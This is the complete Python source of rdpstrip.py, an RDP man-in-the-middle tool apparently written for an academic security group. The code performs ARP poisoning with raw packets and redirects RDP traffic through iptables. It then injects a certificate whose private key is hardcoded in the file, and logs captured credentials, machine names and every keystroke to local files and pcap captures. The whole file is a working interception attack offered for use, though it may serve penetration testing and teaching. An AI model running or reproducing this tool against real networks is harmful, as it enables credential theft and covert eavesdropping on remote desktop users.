#!/usr/bin/python2
# -*- coding: utf-8 -*-
''' 
	Copyright 2016 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        File name rdpstrip.py
        written by tijl[dot]deneut[at]howest[dot]be for XiaK / Ghent University

        [*****************************************************************************]
                        --- Remote Desktop Stripping and Sniffing ---
             This script automates the RDP MiTM process by injecting certificates.
             It has two modes: 
                 - Just a listener (default), which means victims have
                    to connect to our IP (e.g. DNS spoofing) where we inject our keys.
                 - MiTM, which means the script will do arp spoofing, and uses
                    iptables to redirect traffic, however RDP server IP still required

             Functionality:
             * (if needed) it creates (Linux only) or exports the certificates
             * (if needed) it performs arp poisoning (on Linux: including iptables)
             * It will log cleartext information in <log>.txt (creds ...)
             * It will record all keystrokes sent through RDP in <log>_keys.txt
             * It will save cleartext RDP data in pcap files in <log>.pcap (Linux only)
             * Also supports sniff only mode, no injection/capturing/... is done
             
                                       NO WARRANTIES!
        ______________________/-> Created By Tijl Deneut(c) <-\_______________________
        [*****************************************************************************]
'''
import os, sys, argparse, socket, thread, ssl, binascii, string, datetime, subprocess, logging, struct, re, time
from ctypes import CDLL, POINTER, Structure, c_void_p, c_char_p, c_ushort, c_char, c_long, c_int, c_uint, c_ubyte, byref, create_string_buffer, util
try:
	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  ## Gets rid of IPV6 Error when importing scapy
	from scapy.all import PcapWriter,Ether,IP,TCP
	bPcap = True
except: bPcap = False 

##### Initialize Pcap
if os.name == 'nt':
    try:
        _lib = CDLL('wpcap.dll')
    except:
        print('Error: WinPcap not found!')
        print('Please download here: https://www.winpcap.org/install')
        raw_input('Press [Enter] to close')
        sys.exit(1)
else:
    pcaplibrary = util.find_library('pcap')
    if pcaplibrary == None or str(pcaplibrary) == '':
        print('Error: Pcap library not found!')
        print('Please install with: e.g. apt-get install libpcap0.8')
        raw_input('Press [Enter] to close')
        sys.exit(1)
    _lib = CDLL(pcaplibrary)

## match DLL function to open a device
pcap_open_live = _lib.pcap_open_live
pcap_open_live.restype = POINTER(c_void_p)
pcap_open_live.argtypes = [c_char_p, c_int, c_int, c_int, c_char_p]
## match DLL function to send a raw packet
pcap_sendpacket = _lib.pcap_sendpacket
pcap_sendpacket.restype = c_int
pcap_sendpacket.argtypes = [POINTER(c_void_p), POINTER(c_ubyte), c_int]
## match DLL function to close a device
pcap_close = _lib.pcap_close
pcap_close.restype = None
pcap_close.argtypes = [POINTER(c_void_p)]

## Global vars
iBuffer = 65535
lstClients = oAdapter = []
sForwardSocket = sOutfile = sCert = sMitm = sInterface = ''
bSniffOnly = False

## These are here in case generation fails (created with: openssl req -new -days 365 -nodes -x509 -subj "/C=BE/ST=Flanders/L=Kortrijk/O=XiaK/CN=RDPstripTijl" -keyout cert.key -out cert.pem)
S_KEY_FILE = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDJMpw4z3UwQaNO\nF3/TIkEXUaai5iaXI2IzyDtBE4BVckcERtfCYtmnZu208TocmBfc++6cQ4IxELG+\ncKajzHpVLExyvhx83orKk338IoqxV3W4DDQSjffelLIzG8QcDJ+wT+xVdAfHQx5Q\n6uLWopm1pA7QlBoXutPBLpyDpyQmXTZk6pmCaERnwjALYPBtLwezmKiL9igRDAdh\nww7MT7uOxt2xRqSfOXw1/mND9oto6wnXovVaNSi3u5oWdNb/aY+MM8d5nvO10UQI\nFvWuSqLJzSnak+4q28jdXDziTcGFuS0fkkFYnGfAQjoct6awRRl7HAWcP0725tEf\n5HfYXlbHAgMBAAECggEBAJb88hv4JDvIpmMOY5Dw3eRAFEufaEp39VRi6YTWu7Jk\nBkOBXp20TR7BsZXeifu3cAEY12JRjzx/CMSgCY5W/1831U8uuHZFE+cedKdozKh1\nuBQcpF9gRym0cV7FcZCTMKvB7tvaLZQuHGwhOYZVlACqU6vX2RUB0bPh5Pcv0YMv\nj3lG6KO0RQt0+n48M3DgBd0djd6Fxbop7MChREaPY6iqbt88hy3dPO2RirtR1lTc\nCIpGKGq1/Rch6BN4uL+S7+JNuB7gD5aPye0u0veJj9c0EapzqDSWzglIH35w3h23\nIPAEVup/ZT3/RYSEhhztMO/klm/FrJDhdJXP0BLBZnECgYEA7pVySyO67GijEhTV\nBiSBHNwuqXX5nXnRH6gBamxDX2AlIunZ/xEjAqmzAfsxWWLIDelyvJLz6kCBZM5w\ngwiKNIugYGRykIRa0guNst7dr9EP98PmGWpwPt2It4ge8Yx1LDL63miU9XxamyeS\nnA6y+T+mW3WjaLlchiwOP3uub5UCgYEA1+KCJ5vqkBli+2z90Os1PLZv7Ni77Fq0\n03QvJ2PO4tQvvTTRr+FI60bISAjmaqGyMQV7przqUaVm/1abprGNReI4rLGBDVi2\nef9SfdW4l/tE67j6tTJbDmha+dHmSpAAH/41mPki8PuU5zIjdLRlcg/lGvcrKhIz\ns9xsA8bQBesCgYADE4A2wc4uMCcyG3ynqJ7VjW04mCHQyvpMSzFBewXfW/D+oz9B\nT6pA5Yk+VEvNmD12GHV3QvnMImrIrvS6a8jEZqx5sbHcdShqnuWD0eXP14U6L5du\n6nVqChcyLpofiS0Vlc6wQW7yP1k3uOnmAzaBijWN5lVmC0XLIRRJ80FLhQKBgD/v\nXB6A5YHRkuflSnIiBn05hoI9WcJQxrbM9N4UiAPTVWQSjXsqHB9ZshzrTdoMkypD\ndnBWCIsvkgZSzvwaHz2wFprGYvLh8ADHZdXQgr+38ZxiBxW8mQz2SOMtj6dLaE4R\nSixItFlsGJgz2B5LArQ6Et7ejpECHP/Kas7fhWILAoGAQoNMKdTPggPB3xDUs7gs\nrNcJLeW2zXO+4pi7hTC/O+12awJ1G/cQJ2vmgOvEkXBLaJjya3w0gSvNDvPqiQtO\nODvTrGQYtLH1w18JamglqSMa+wjPHKjPRUrQTL8KHMxsnoM3hjYY2XLyERKVAq9w\nnr74fT1/BLEzZyaCnGedtM4="
S_PEM_FILE = "MIIDhTCCAm2gAwIBAgIJALWxa+0KqLilMA0GCSqGSIb3DQEBCwUAMFkxCzAJBgNV\nBAYTAkJFMREwDwYDVQQIDAhGbGFuZGVyczERMA8GA1UEBwwIS29ydHJpamsxDTAL\nBgNVBAoMBFhpYUsxFTATBgNVBAMMDFJEUHN0cmlwVGlqbDAeFw0xNjAyMjUxOTMx\nNDNaFw0xNzAyMjQxOTMxNDNaMFkxCzAJBgNVBAYTAkJFMREwDwYDVQQIDAhGbGFu\nZGVyczERMA8GA1UEBwwIS29ydHJpamsxDTALBgNVBAoMBFhpYUsxFTATBgNVBAMM\nDFJEUHN0cmlwVGlqbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMky\nnDjPdTBBo04Xf9MiQRdRpqLmJpcjYjPIO0ETgFVyRwRG18Ji2adm7bTxOhyYF9z7\n7pxDgjEQsb5wpqPMelUsTHK+HHzeisqTffwiirFXdbgMNBKN996UsjMbxBwMn7BP\n7FV0B8dDHlDq4taimbWkDtCUGhe608EunIOnJCZdNmTqmYJoRGfCMAtg8G0vB7OY\nqIv2KBEMB2HDDsxPu47G3bFGpJ85fDX+Y0P2i2jrCdei9Vo1KLe7mhZ01v9pj4wz\nx3me87XRRAgW9a5KosnNKdqT7irbyN1cPOJNwYW5LR+SQVicZ8BCOhy3prBFGXsc\nBZw/Tvbm0R/kd9heVscCAwEAAaNQME4wHQYDVR0OBBYEFGKGB/x//9yEHilqL1T8\n6sCirTnJMB8GA1UdIwQYMBaAFGKGB/x//9yEHilqL1T86sCirTnJMAwGA1UdEwQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAI6Gclcs1Rhoy8ofKmRokDFRVfjQSCJY\n7pDPZIlowCSuJWnUwJ3KPohJ4Y5HsAMAgJ50MnQShqZMjoPBOCam7abxDxD7EMui\nr26TEtPancGcv0NLeJj1e5cnvBlxycBqBkQmO8ksJEOqccmW1+nEwEZ308lVkVCG\n7GnoF24gHpWwVpYIMWH6sT3qZy5G8Lp89XjcUF1EqvG8Hlnk0PWvendy1u9k60v7\n/z6m2Tho+c3uYz+X0I1+AeoiWfEAw2S0SSnWRT5DldjrlXb0U7u3DV7esbN/IAvG\nj4P1Gb8dqNc73P9k1XyjDXaiLXeY5uHGu2wqHtMjkGjYC28x9lbtyGs="

ARR_WIN32_KEYCODES_BE = {'\x02':'&1','\x03':'é2@','\x04':'"3#','\x05':'\'4','\x06':'(5','\x07':'§6^','\x08':'è7','\x09':'!8','\x0a':'ç9','\x0b':'à0',
'\x0c':')°','\x0d':'-_','\x0e':'<BACKSPACE>','\x0f':'<TAB>','\x10':'a','\x11':'z','\x12':'e','\x13':'r','\x14':'t','\x15':'y','\x16':'u','\x17':'i',
'\x18':'o','\x19':'p','\x1a':'^¨[','\x1b':'$*]','\x1c':'<ENTER>','\x1d':'<LCTRL>','\x1e':'q','\x1f':'s','\x20':'d','\x21':'f','\x22':'g','\x23':'h','\x24':'j',
'\x25':'k','\x26':'l','\x27':'m','\x28':'ù%´','\x29':'','\x2a':'<LSHIFT>','\x2b':'µ£`','\x2c':'w','\x2d':'x','\x2e':'c','\x2f':'v','\x30':'b','\x31':'n',
'\x32':'?,','\x33':';.','\x34':':/','\x35':'=+~','\x36':'<RSHIFT>','\x37':'<Keypad-*>','\x38':'<LALT>','\x39':'<space>','\x3a':'<caps>','\x3b':'F1','\x3c':'F2',
'\x3d':'F3','\x3e':'F4','\x3f':'F5','\x40':'F6','\x41':'F7','\x42':'F8','\x43':'F9','\x44':'F10','\x45':'<NumLock>','\x46':'<SCROLLOCK>','\x47':'<Keypad-7/Home>',
'\x48':'<Keypad-8/Up>','\x49':'<Keypad-9/PgUp>','\x4a':'<Keypad-->','\x4b':'<Keypad-4/Left>','\x4c':'<Keypad-5>','\x4d':'<Keypad-6/Right>','\x4e':'<Keypad-+>','\x4f':'<Keypad-1/End>',
'\x50':'<Keypad-2/Down>','\x51':'<Keypad-3/PgDn>','\x52':'<Keypad-0/Ins>','\x53':'<Keypad-./Del>','\x54':'<Alt-SysRq>','\x56':'<>\\'}

def initProgram(argv):
	print("""
[*****************************************************************************]
                --- Remote Desktop Stripping and Sniffing ---
     This script automates the RDP MiTM process by injecting certificates.
     It has two modes: 
         - Just a listener (default), which means victims have
            to connect to our IP (e.g. DNS spoofing) where we inject our keys.
         - MiTM, which means the script will do arp spoofing, and uses
	    iptables to redirect traffic, however RDP server IP still required

     Functionality:
     * (if needed) it creates (Linux only) or exports the certificates
     * (if needed) it performs arp poisoning (on Linux: including iptables)
     * It will log cleartext information in <log>.txt (creds ...)
     * It will record all keystrokes sent through RDP in <log>_keys.txt
     * It will save cleartext RDP data in pcap files in <log>.pcap (Linux only)
     * Also supports sniff only mode, no injection/capturing/... is done
     
                               NO WARRANTIES!
______________________/-> Created By Tijl Deneut(c) <-\_______________________
[*****************************************************************************]
""")
	## Defaults and parsing arguments
	parser = argparse.ArgumentParser()
	parser.add_argument('-m', metavar='clientip', help="MiTM mode, adds arp spoofing and port redirection", default='')
	parser.add_argument('-f', metavar='ip:<port>', help="Forward to this IP:<port>, IP is required", default='')
	parser.add_argument('-p', metavar='3389', help="Port to listen on, default is 3389", default=3389, type=int)
	parser.add_argument('-o', metavar='log', help="Output file(s), default is 'rdpstrip'", default='rdpstriplog')
	parser.add_argument('-c', metavar='cert', help="Certs to use, default is 'cert': .key is private, .pem is public.", default='cert')
	parser.add_argument('-i', metavar='interface', help="Interface to use, e.g. eth0, Linux Only")
	parser.add_argument('-s', help="Sniff only, just show all detected RDP traffic", action='store_true')
	args = parser.parse_args()
	return args

## Array of devices in this form: adapter, ip, mac, windows name, windows guid (e.g. Ethernet, 1.1.1.1, aa:bb:cc:dd:ee:ff, Intel 82575LM, 875F7EDB-CA23-435E-8E9E-DFC9E3314C55})
def getAllInterfaces(): 
    def addToArr(array, adapter, ip, mac, device, winguid):
        if len(mac) == 17: array.append([adapter, ip, mac, device, winguid]) # When no or bad MAC address (e.g. PPP adapter), do not add
        return array
    interfaces=[]
    if os.name == 'nt':
        proc = subprocess.Popen("getmac /NH /V /FO csv | FINDSTR /V disconnected", shell=True, stdout=subprocess.PIPE)
        for interface in proc.stdout.readlines():
            intarr = interface.split(',')
            adapter = intarr[0].replace("\"","")
            devicename = intarr[1].replace("\"","")
            mac = intarr[2].replace("\"","").lower().replace("-",":")
            winguid = intarr[3].replace("\"",'').replace('\n', '').replace('\r', '')[-38:]
            proc = subprocess.Popen("netsh int ip show addr \""+adapter+"\" | FINDSTR /I IP", shell=True, stdout=subprocess.PIPE)
            try: ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', proc.stdout.readlines()[0].replace(' ',''))[0]
            except: ip = ''
            interfaces = addToArr(interfaces, adapter, ip, mac, devicename, winguid)
    else:
        proc = subprocess.Popen("for i in $(ip address | grep -v \"lo\" | grep \"default\" | cut -d\":\" -f2 | cut -d\" \" -f2);do echo $i $(ip address show dev $i | grep \"inet \" | cut -d\" \" -f6 | cut -d\"/\" -f1) $(ip address show dev $i | grep \"ether\" | cut -d\" \" -f6);done", shell=True, stdout=subprocess.PIPE)
        for interface in proc.stdout.readlines():
            intarr = interface.split(' ')
            interfaces = addToArr(interfaces, intarr[0], intarr[1], intarr[2].replace('\n',''), '', '')
    return interfaces

def is_ipv4(ip):
	match = re.match("^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})$", ip)
	if not match: return False
	quad = []
	for number in match.groups(): quad.append(int(number))
	if quad[0] < 1: return False
	for number in quad: 
		if number > 255 or number < 0: return False
	return True

def writePCAP(src, dst, data):
	try: 
		pktdump = PcapWriter(sOutfile + '.pcap', append=True, sync=True)
		pktinfo = Ether()/IP(src=src[0],dst=dst[0])/TCP(sport=src[1],dport=dst[1])/data
		pktdump.write(pktinfo)
		pktdump.close()
	except Exception as Error: 
		#print(str(Error))
		pass

def generateCerts(sCertname):
	def exportCerts(sCertname):
                fPrivateKey = open(sCertname + '.key','wb')
		fPrivateKey.write('-----BEGIN PRIVATE KEY-----\n')
		fPrivateKey.write(S_KEY_FILE + '\n')
		fPrivateKey.write('-----END PRIVATE KEY-----')
		fPrivateKey.close()
		fPublicKey = open(sCertname + '.pem','wb')
		fPublicKey.write('-----BEGIN CERTIFICATE-----\n')
		fPublicKey.write(S_PEM_FILE + '\n')
		fPublicKey.write('-----END CERTIFICATE-----\n')
		fPublicKey.close()
	if os.name == 'nt':
		os.system('cls')
		exportCerts(sCertname)
		#TODO use certreq and certutil.exe ?
	else:
		os.system('clear')
		os.system('openssl req -new -days 365 -nodes -x509 -subj "/C=BE/ST=Flanders/L=Kortrijk/O=XiaK/CN=RDPstripXiaK" -keyout '+sCertname+'.key -out '+sCertname+'.pem')
		if not os.path.isfile(sCert + '.key') and not os.path.isfile(sCert + '.pem'):
			print('Something went wrong, openssl not working correctly. Creating hardcoded keyfiles.')
			exportCerts(sCertname)
		

def logToFile(oData):
	try:
		f = open(sOutfile+'.txt','a+')
		ts = str(datetime.datetime.now()).split('.')[0]
		if '\x44\x75\x63\x61' in oData: ## String has 'Duca' in it
			f.write(ts + ' - We should see the client PC Name here:\n' + oData.replace('\x00','')[137:].split('\x04')[0].split('\x07')[0] + '\n')
		elif oData[:6] == '\x03\x00\x01\x75\x02\xf0':
			sPCandUser=oData.replace('\x00','')[23:].split('\x40')[0]
			f.write(ts + ' - We should see the server PC Name and (default) username here:\n' + sPCandUser + '\n')
		elif '\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00' in oData: ## String has 'ystem32' in it
			#sCreds = oData.replace('\x00','').split('\x14')[1].split('\x40')[0]
			sCreds = oData.replace('\x00','')
			sCreds = ''.join(filter(lambda x:x in string.printable, sCreds))
			f.write(ts + ' - We may have credentials here! (Sent during preconnection, SRV USER PASS CLIENTIP): \n' + sCreds + '\n')
			drawClients('Credentials captured!: \n' + sCreds+'\n')
		elif oData[:3] == '\x44\x04\x01': ## would be the same as oData[:3].encode('hex') == '440401'
			f2 = open(sOutfile+'_keys.txt','a+')
			try: f2.write(ARR_WIN32_KEYCODES_BE[oData[3]]+' ')
			except: pass
			f2.close()
		f.close()
	except: pass

def drawClients(sMessage=''):
	os.system('cls' if os.name == 'nt' else 'clear')
	print('###\n'+sMessage+'\n###')
	print("--------- List of connected clients -----------")
	for l in lstClients:
		print(" "+l[1][0]+":"+str(l[1][1])+" ---> "+sForwardSocket)
	print('-------------------- END ----------------------')

## Expects hexstring like this 01020304050607 and returns bytearray, packet to be sent
def createPacket(sHexString):
    sHexString = binascii.unhexlify(sHexString.replace(' ',''))
    packet = (c_ubyte * len(sHexString))()
    b = bytearray()
    b.extend(sHexString)
    for i in range(0,len(sHexString)): packet[i] = b[i]
    return packet

def startListener(iPort):
	oServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	oServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	oServerSocket.bind(('', iPort))
	oServerSocket.listen(200) ## Max queued connections
	print('Socket is listening on port '+str(iPort)+'.\nWaiting for clients...')
	if os.name == 'nt': print('Watch your Firewall settings!')
	if not bSniffOnly:
                print('Forwarding to '+sForwardSocket)
	print('Press [Ctrl+Break] to stop the listener.')
	while True:
		oClientSocket, addr = oServerSocket.accept()
		lstClients.append((oClientSocket, addr))
		thread.start_new_thread(acceptConnection,(oClientSocket, addr))
		drawClients('We have a connection from '+addr[0]+', client port '+str(addr[1]))
		
# Function to be threaded
def acceptConnection(oClientSocket, addr, sForwardIP=''):
	## Before starting the forward, let's take a look at the first packets (COTP, TPDU)
	## Client
	clientData = oClientSocket.recv(iBuffer)
	if clientData[15] == '\x01': print("We can intercept this!")
	elif clientData[15] == '\x03': print("Let's try injection.")
	## Then create new connection to where we want it (either retrieved from session or sForwardSocket)
	oClientToServersocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if not sForwardIP:
		oClientToServersocket.connect((sForwardSocket.split(':')[0],int(sForwardSocket.split(':')[1])))
	else: ## True man-in-the-middle, forward traffic to IP it's intended for
		drawClients('true mitm: '+str(clientData))
		oClientToServersocket.connect((sForwardIP,3389))
	## Server start sending the data
	oClientToServersocket.sendall(clientData)
	serverData = oClientToServersocket.recv(iBuffer)
	## serverData = TCP data of the packets, byte 15 (so byte 16 out of 19) of the CR is 01 with RDPv5
	## 				  in RDPv6+ the connection exists out of 2 TCP sessions... byte 15 is 02, the request is different
	## First finish the COTP handshake ...
	oClientSocket.sendall(serverData)
	## ... then force our SSL handshake when not in listenonly mode (always force this)
	if not bSniffOnly:
		drawClients('\n ==> Injecting certificate for client ' + str(oClientSocket.getpeername()[0]))
		try: oSSLServerSocket = ssl.wrap_socket(oClientToServersocket,ssl_version=ssl.PROTOCOL_TLSv1)
		except:
                        drawClients('\nError: Injection failed, NLA seems to be enabled on the server.')
                        sys.exit(0)
		oSSLServerSocket.do_handshake()
		oSSLClientSocket = ssl.wrap_socket(oClientSocket, server_side=True, certfile='cert.pem', keyfile='cert.key',ssl_version=ssl.PROTOCOL_TLSv1)
		oSSLClientSocket.do_handshake()
		if serverData[15] == '\x01': ## When SSL force not successful, we're dealing with the extra session of RDPv6+ and we forward the normal Client Socket
			oClientSocket = oSSLClientSocket
			oClientToServersocket = oSSLServerSocket
	## Start forwarding, each connection has 2 threads, send & receive
	thread.start_new_thread(forwardTraffic,(oClientSocket, oClientToServersocket, addr))
	thread.start_new_thread(forwardTraffic,(oClientToServersocket, oClientSocket, ''))

def forwardTraffic(oSourceSocket,oDestinationSocket, oClient):
	data = ' '
	try:
		while data:
			data = oSourceSocket.recv(iBuffer)
			## This is the place where the magic happens
			logToFile(data)
			if bPcap: writePCAP(oSourceSocket.getpeername(), oDestinationSocket.getpeername(), data)
			oDestinationSocket.sendall(data)
	except:
		oSourceSocket.close()
		oDestinationSocket.close()
		#if oClient:
			#lstClients.remove((oSourceSocket, oClient)) ## TODO FIX BUG
			#print('Lost a connection!')
		drawClients('Session closed')

## Also function to be threaded
def arpSpoof(sClientIP, oAdapter): #adapter[] = npfdevice, ip, mac
	def ipToHex(ipstr):
		iphexstr = ''
		for s in ipstr.split('.'):
			if len(hex(int(s))[2:]) == 1: iphexstr += '0'
			iphexstr += str(hex(int(s))[2:])
		return iphexstr
	## We need the MAC address of the client to spoof
	if os.name == 'nt': 
		os.system('ping -n 1 -w 10 ' + sClientIP + ' > nul')
		proc = subprocess.Popen("arp -a | FINDSTR " + sClientIP, shell=True, stdout=subprocess.PIPE)
	else: 
		os.system('ping -c 1 -W 1 ' + sClientIP + ' > /dev/null')
		proc = subprocess.Popen(["arp -n " + sClientIP + " | grep -i ether"], shell=True, stdout=subprocess.PIPE)
	try: sDestMAC = re.findall(r'(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})', proc.stdout.readlines()[0].replace('-',':'))[0][0]
	except Exception as Error: 
		print('Error: '+str(Error))
		sys.exit(1)
		
	## Layer2
	sDestMAC = sDestMAC.replace(':','')
	sSrcMAC = oAdapter[2]
	sEtherType = '0806' # Ethertype ARP
	## Layer3
	sARPHeaders = '0001' + '0800' + '06' + '04' + '0002'
	sSenderMAC = sSrcMAC
	sSenderIP = ipToHex(sForwardSocket.split(':')[0]) ## IP to spoof
	sTargetMAC = sDestMAC # 
	sTargetIP = ipToHex(sClientIP)
	sARPPadding = '000000000000000000000000000000000000'
	
	sARPPacket = sDestMAC + sSrcMAC + sEtherType + sARPHeaders + sSenderMAC + sSenderIP + sTargetMAC + sTargetIP + sARPPadding
	try:
		while True:
			sendRawPacket(oAdapter[0],sARPPacket)
			time.sleep(2)
	except Exception as Error:
		print('Error: '+str(Error))
		sys.exit(1)
	except KeyboardInterrupt:
		sARPPacket = sDestMAC + '000000000000' + sEtherType + sARPHeaders + '000000000000' + sSenderIP + sTargetMAC + sTargetIP + sARPPadding
		sendRawPacket(oAdapter[0],sARPPacket)
		time.sleep(1)
		sendRawPacket(oAdapter[0],sARPPacket)
	sys.exit(1)

def sendRawPacket(oDevice, oData): ## '\\Device\\NPF_{24914...', '005056...'
	packet = createPacket(oData)
	fp = c_void_p
	errbuf = create_string_buffer(256)
	fp = pcap_open_live(oDevice, 65535, 1, 1000, errbuf)
	if not bool(fp):
		print("\nUnable to open the adapter. %s is not supported by Pcap\n" % str(oDevice))
		sys.exit(1)
	if pcap_sendpacket(fp, packet, len(packet)) != 0:
		print ("\nError sending the packet: %s\n" % pcap_geterr(fp))
		sys.exit(1)
	pcap_close(fp)

def selectInterface(): #adapter[] = npfdevice, ip, mac
	arrInterfaces = getAllInterfaces()
	answer = ''
	i = 1
	for interface in arrInterfaces: #array of arrays: adapter, ip, mac, windows devicename, windows guid
		print('[' + str(i) + '] ' + interface[2] + ' has ' + interface[1] + ' (' + interface[0] + ')')
		if sInterface == interface[0]: answer = str(i)
		i += 1
	if answer == '' : answer = raw_input('Please select the adapter [1]: ')
	if answer == '' or not answer.isdigit() or int(answer) >= i: answer = 1
	npfdevice = arrInterfaces[int(answer) - 1][0]
	ipaddr = arrInterfaces[int(answer) - 1][1]
	macaddr = arrInterfaces[int(answer) - 1][2].replace(':', '')
	if os.name == 'nt': npfdevice = '\Device\NPF_' + arrInterfaces[int(answer) - 1][4]
	return (npfdevice, ipaddr, macaddr)
	
def main(argv):
	global sForwardSocket, sOutfile, sCert, sMitm, bSniffOnly, sInterface
	os.system('cls' if os.name == 'nt' else 'clear')
	args = initProgram(argv) ## Show banner, parse argumens
	sMitm = args.m
	if args.s: bSniffOnly = True
	sInterface = args.i
	iPort = args.p
	sOutfile = args.o
	sCert = args.c
	sForwardIP = args.f.split(':')[0]
	sForwardPort = 3389
	if ':' in args.f: sForwardPort = args.f.split(':')[1]
	if not bPcap: ## Is PcaP loaded? 
		print('Scapy not found, pcap export unavailable.'+'\n')
	if (len(argv) == 0 or not sForwardIP) and not bSniffOnly: ## Arguments supplied?
		print('You didn\'t provided enough arguments, I need at least an RDP server IP')
		print('Example1: python rdpstrip.py -f192.168.0.1')
		print('Example2: python rdpstrip.py -f192.168.0.1:3389 -p10000 -cmycerts')
		print('')
		sForwardIP = raw_input('Please provide an IP or press <Enter> to exit: ')
		if not is_ipv4(sForwardIP): sys.exit(1)
	if (not os.path.isfile(sCert + '.key') or not os.path.isfile(sCert + '.pem')) and not bSniffOnly:
		print('The certificate and/or key (' + sCert + '.pem) and (' + sCert + '.key) are not found.')
		answer = raw_input('Should I create them? [Y/n] ')
		if answer.lower() == 'y' or answer.lower() == '':
                        generateCerts(sCert)
		else:
			print('Without certificates, no interception...')
			sys.exit(1)
	if sMitm:
		if os.name == 'nt': 
			os.system('cls')
			print('General Error, proper redirection (IP1 <> IPx <> IP2) is not possible in Windows')
			print('Details, this command: ')
			print('     > netsh interface portproxy add v4tov4 listenport=3389 connectport=10000 protocol=tcp connectaddress=127.0.0.1')
			print('does not seem to accept traffic not destined for our own IP')
			sys.exit(1)
		else:
			print('MiTM mode selected, I will do arp poisoning for you, using this IP: ' + sMitm)
			## Now all we need is an iptables rule, on Windows this exists too:
			## netsh interface portproxy add v4tov4 listenport=3389 connectport=10000 protocol=tcp connectaddress=127.0.0.1
			## But doesn't work for MiTM (target IP has to belong to the host, I think)
			if (iPort == 3389):
                                print('No special port specified, I will use port 13389 as a temp port')
                                iPort = 13389
                        os.system('iptables -t nat -F')
			os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 3389 -j REDIRECT --to-port ' + str(iPort))
			oAdapter = selectInterface() #adapter[] = npfdevice, ip, mac
			if is_ipv4(sMitm): thread.start_new_thread(arpSpoof,(sMitm, oAdapter))
	if sForwardIP: sForwardSocket = sForwardIP +':'+ str(sForwardPort)
	os.system('cls' if os.name == 'nt' else 'clear')
	startListener(iPort)
	
if __name__ == '__main__':
	try:
		main(sys.argv[1:])
	except KeyboardInterrupt:
		print('SIGINT pressed')
		sys.exit(1)
